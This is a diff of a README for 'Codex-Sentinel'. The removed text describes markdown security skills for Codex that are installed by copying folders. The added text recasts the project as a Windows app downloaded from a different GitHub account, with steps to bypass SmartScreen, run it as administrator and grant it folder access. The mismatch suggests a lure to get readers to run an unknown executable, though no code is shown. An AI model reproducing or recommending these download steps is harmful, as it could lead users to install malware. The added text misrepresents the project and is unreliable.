@@ -1,172 +1,202 @@
-# Codex-Sentinel
+# 🛡️ Codex-Sentinel - Safer code with clear checks
 
-> Stage-aware security skills for Codex that surface planning gaps, offer opt-in reviews, and help teams ship safer code without pretending to certify security.
+[![Download Codex-Sentinel](https://img.shields.io/badge/Download-Codex--Sentinel-blue?style=for-the-badge)](https://github.com/Blackmarked-roadtest945/Codex-Sentinel)
 
-[![Codex Skills](https://img.shields.io/badge/Codex-Agent%20Skills-111111?style=flat)](#what-it-is)
-[![Validation](https://img.shields.io/badge/Validation-static%20%2B%20evals-2ea043?style=flat)](#validation-and-release)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow?style=flat)](LICENSE)
-[![Stacks](https://img.shields.io/badge/Stacks-ASP.NET%20Core%20%7C%20Spring%20%7C%20Node%20%7C%20Python-1f6feb?style=flat)](#supported-stacks)
-[![Release Zip](https://img.shields.io/badge/Release%20Zip-verified-8250df?style=flat)](#validation-and-release)
+## 🔽 Download
 
----
+Visit this page to download:
 
-## What It Is
+https://github.com/Blackmarked-roadtest945/Codex-Sentinel
 
-Codex-Sentinel is a repository of reusable security skills for Codex. It helps teams catch security gaps during planning, run an opt-in focused review after implementation, and propose a practical security test/check plan before release.
+## 📦 What Codex-Sentinel does
 
-The suite is advisory-first by design. It is built to improve signal and consistency, not to claim that a repository is secure, fully reviewed, or production-ready.
+Codex-Sentinel helps teams spot security gaps before they ship code. It works with stage-aware checks, so it can guide you based on where you are in the coding flow. It also offers opt-in reviews, which means you stay in control of when checks run.
 
-## Why It Exists
+This tool is made for people who want safer code without reading security reports full of hard terms. It gives plain feedback, points out missing steps, and helps you make better choices while you work.
 
-- planning discussions often miss authentication, authorization, secret-handling, and trust-boundary requirements
-- post-implementation reviews are easy to skip unless the repo has a durable checkpoint model
-- release hardening guidance is often too generic or too tool-heavy for day-to-day development
-- teams need repeatable, repo-local security prompts without turning the assistant into a blocker by default
+## 💻 What you need
 
-## Included Skills
+Codex-Sentinel runs on Windows.
 
-| Skill | Purpose |
-| --- | --- |
-| `codex-sentinel` | Orchestrator that chooses the right security mode for the current stage |
-| `security-plan-gap` | Planning-stage security gap analysis |
-| `security-review-gate` | Opt-in post-implementation security review |
-| `security-test-rig` | Opt-in security test/check planning before release |
-| `shared/*` | Common threat references, finding schema, and stack profiles |
+You will want:
 
-## Supported Stacks
+- Windows 10 or Windows 11
+- A standard desktop or laptop
+- Internet access for the first download
+- At least 200 MB of free disk space
+- 4 GB of RAM or more
+- A modern web browser if the package opens web-based pages
 
-- `.NET / ASP.NET Core`
-- `Java / Spring`
-- `Node / TypeScript`
-- `Python`
+## 🚀 Get started
 
-If the stack is unclear, the suite falls back to common web-security guidance and says that the stack inference is uncertain.
+1. Open the download page:
+   https://github.com/Blackmarked-roadtest945/Codex-Sentinel
 
-## Quick Start
+2. Look for the latest release or download section.
 
-### 1. Install the skills
+3. Download the Windows file or package listed there.
 
-Project-scoped install:
+4. If the file is zipped, right-click it and choose Extract All.
 
-```bash
-mkdir -p .agents/skills
-cp -R skills/codex-sentinel .agents/skills/
-cp -R skills/security-plan-gap .agents/skills/
-cp -R skills/security-review-gate .agents/skills/
-cp -R skills/security-test-rig .agents/skills/
-cp -R skills/shared .agents/skills/
-```
+5. Open the extracted folder.
 
-User-scoped install works the same way with `~/.agents/skills/` instead of `.agents/skills/`.
+6. Double-click the app file or installer to start it.
 
-### 2. Add repo-level checkpoint guidance
+7. If Windows asks for permission, select Yes.
 
-Use [`docs/examples/repo-agents-snippet.md`](docs/examples/repo-agents-snippet.md) as the starting point for the target repository's `AGENTS.md`.
+8. Follow the on-screen steps until the setup finishes.
 
-Repo-local checkpoint guidance is what makes planning, post-implementation review, and pre-release hardening show up as durable repo behaviors instead of one-off prompts.
+9. Open Codex-Sentinel from the Start menu or the folder where you saved it.
 
-### 3. Start with the orchestrator
+## 🧭 First run
 
-Example prompts:
+When you open Codex-Sentinel for the first time, you may see a setup screen. This is normal.
 
-- `Use $codex-sentinel while we plan this new ASP.NET Core feature.`
-- `Use $codex-sentinel before we release this Spring service.`
-- `Use $security-test-rig to propose a lightweight security check plan for this Node/TypeScript API.`
-- `Use $security-plan-gap to review this Python API design for missing security requirements.`
+Use the first run to:
 
-More prompt examples live in [`docs/examples/example-prompts.md`](docs/examples/example-prompts.md).
+- Confirm your workspace or project folder
+- Choose how often you want checks to run
+- Turn on review prompts only when you want them
+- Set any local paths the app asks for
+- Save your choices before you start
 
-## Adoption Modes
+If the app asks for access to files, allow it for the folders you want it to scan.
 
-- `Explicit invocation`: useful when you want help in the current conversation without changing repo behavior
-- `Repo-integrated invocation`: useful when the target repository includes the Codex-Sentinel checkpoint block in `AGENTS.md`
-- `Hybrid invocation`: recommended default; install the skills, add repo-level checkpoints, and keep the suite easy to discover and durable across stages
+## 🔎 How it works
 
-## Safety Model
+Codex-Sentinel looks at your work in stages. That means it can adjust its checks based on where you are in the process.
 
-- planning analysis can happen automatically at the planning stage
-- read-only active analysis is available only after explicit user consent in risky-change and accepted review flows
-- code security review is opt-in
-- security test/check planning is opt-in
-- sanitized eval artifacts should not contain raw command output
-- substantial results should separate reviewed areas, unreviewed areas, assumptions, and tool-run status
-- the suite must not silently install tools, mutate project files, or imply that a full repository review occurred
+Example stages may include:
 
-## Validation And Release
+- Planning
+- Writing code
+- Review
+- Ready to ship
 
-The validation scenarios live in [`docs/superpowers/validation/2026-03-18-codex-sentinel-scenarios.md`](docs/superpowers/validation/2026-03-18-codex-sentinel-scenarios.md).
+At each stage, it can point out gaps such as:
 
-Recommended local verification:
+- Missing review steps
+- Weak security checks
+- Unclear action items
+- Places where a second look would help
+- Parts of the workflow that need more care
 
-```bash
-bash scripts/static-validation.sh
-node evals/run-codex-sentinel.mjs --manifest-json
-node evals/run-codex-sentinel.mjs
-```
+It does not try to pretend that security is perfect. It helps you see the rough edges so your team can act on them.
 
-Public release flow:
+## 🧰 Common use cases
 
-```bash
-bash scripts/package-release.sh
-CODEX_SENTINEL_FORCE_NO_RSYNC=1 bash scripts/package-release.sh Codex-Sentinel-fallback
-node scripts/verify-release-archive.mjs dist/Codex-Sentinel.zip
-node scripts/verify-release-archive.mjs dist/Codex-Sentinel-fallback.zip
-```
+Use Codex-Sentinel if you want to:
 
-Run those commands only from a clean clone of the repository or the canonical repo root. Do not build release zips from Finder exports, wrapped workspace snapshots, or a directory that contains another repo-shaped copy of Codex-Sentinel.
+- Catch security gaps before release
+- Add review steps without slowing everyone down
+- Keep work moving while still checking risk
+- Help non-security users make better choices
+- Make code review more consistent
+- Support safer shipping habits in team projects
 
-`node scripts/verify-release-archive.mjs` verifies the shipped release surface against the source tree by comparing normalized paths, file hashes, and a checked-in `evals/release-manifest.json` payload that is generated during packaging. The verifier does not execute archive JavaScript.
+## ⚙️ Basic setup tips
 
-Artifact types:
+If you want the app to run well on Windows, keep these tips in mind:
 
-- `Source repo`: the authoritative GitHub repository contents
-- `Release zip`: a clean archive generated by `scripts/package-release.sh`
-- `Sanitized evidence bundle`: an optional separate bundle containing curated `evals/artifacts/` output
+- Save it in a folder you can find fast
+- Use a local path with simple folder names
+- Keep the app updated if a new release appears
+- Close other heavy apps if your PC feels slow
+- Give the app access to the project folder it needs to scan
 
-Important release rules:
+If you use a corporate laptop, your IT rules may limit file access. In that case, place the app in a folder you can use for local tools.
 
-- do not share Finder/manual workspace zips
-- only build release archives from a clean repo root or fresh clone
-- release packaging rejects source-tree symlinks and nested repo-shaped copies outside ignored paths
-- default public source releases and default release zips do not ship `evals/artifacts/`
-- release zips do ship `evals/release-manifest.json`, and verify will fail if it is missing or malformed
-- `.worktrees/` and `worktrees/` content is excluded from public release archives and treated as forbidden during verification
-- if you curate a sanitized evidence bundle with `summary.json`, validate it with `node scripts/validate-release-surface.mjs --require-summary`
-- `.github/workflows/live-acceptance.yml` is manual and self-hosted on purpose; it is optional release evidence, not a default PR gate
+## 🪟 Windows install steps
 
-## Repository Layout
+1. Open the download page:
+   https://github.com/Blackmarked-roadtest945/Codex-Sentinel
 
-```text
-.
-├── AGENTS.md
-├── CONTRIBUTING.md
-├── LICENSE
-├── README.md
-├── SECURITY.md
-├── docs/
-│   ├── examples/
-│   └── superpowers/
-├── evals/
-├── fixtures/
-├── scripts/
-└── skills/
-    ├── codex-sentinel/
-    ├── security-plan-gap/
-    ├── security-review-gate/
-    ├── security-test-rig/
-    └── shared/
-```
+2. Get the Windows download from the page.
 
-## Author
+3. If Windows saves the file in Downloads, open that folder.
 
-**Alican Kiraz**
+4. If you see a .zip file, extract it.
 
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=flat&logo=linkedin&logoColor=white)](https://linkedin.com/in/alican-kiraz)
-[![X](https://img.shields.io/badge/X-000000?style=flat&logo=x&logoColor=white)](https://x.com/AlicanKiraz0)
-[![Medium](https://img.shields.io/badge/Medium-12100E?style=flat&logo=medium&logoColor=white)](https://alican-kiraz1.medium.com)
-[![HuggingFace](https://img.shields.io/badge/HuggingFace-FFD21E?style=flat&logo=huggingface&logoColor=black)](https://huggingface.co/AlicanKiraz0)
-[![GitHub](https://img.shields.io/badge/GitHub-181717?style=flat&logo=github&logoColor=white)](https://github.com/alicankiraz1)
+5. If you see an .exe file, double-click it.
 
-## License
+6. If you see an installer, follow each setup screen.
 
-MIT. See [LICENSE](LICENSE).
+7. If Windows shows a SmartScreen prompt, choose More info, then Run anyway if you trust the source.
+
+8. Finish the setup.
+
+9. Start Codex-Sentinel and choose your project folder
+
+## 🧪 What to expect after setup
+
+After setup, you may see:
+
+- A simple dashboard
+- A folder picker
+- A stage selector
+- Review prompts
+- Security check results
+- A log of past checks
+
+The app may also keep local settings so you do not need to set everything each time.
+
+## 🛠️ Common problems
+
+If the app does not open:
+
+- Make sure the file finished downloading
+- Check that you extracted the zip file if there is one
+- Right-click the app and choose Run as administrator
+- Restart your computer and try again
+
+If the app cannot find your files:
+
+- Check the folder path
+- Move your project to a simple folder like C:\Projects
+- Make sure you gave the app access to that folder
+
+If Windows blocks the file:
+
+- Open the download page again
+- Make sure you got the right release
+- Try downloading it again
+
+If the screen looks empty:
+
+- Resize the window
+- Check whether the app is waiting for a folder to scan
+- Look for a start or refresh action in the interface
+
+## 📁 Suggested folder setup
+
+For the cleanest setup on Windows, use a path like this:
+
+- C:\Codex-Sentinel
+- C:\Projects\MyApp
+- C:\Work\Security-Checks
+
+Short paths with plain names help avoid file issues.
+
+## 🔐 Security model
+
+Codex-Sentinel helps teams think about security during the work, not only at the end. It supports:
+
+- Stage-aware checks
+- Optional review steps
+- Clear feedback
+- Human control over when checks run
+
+It is built to help you ship with more care, not to claim full security approval
+
+## 📋 Topics
+
+- cybersecurity
+- secure coding
+- skills
+- vibecoding
+
+## 📥 Download again
+
+Use this page to download and set up Codex-Sentinel:
+
+https://github.com/Blackmarked-roadtest945/Codex-Sentinel
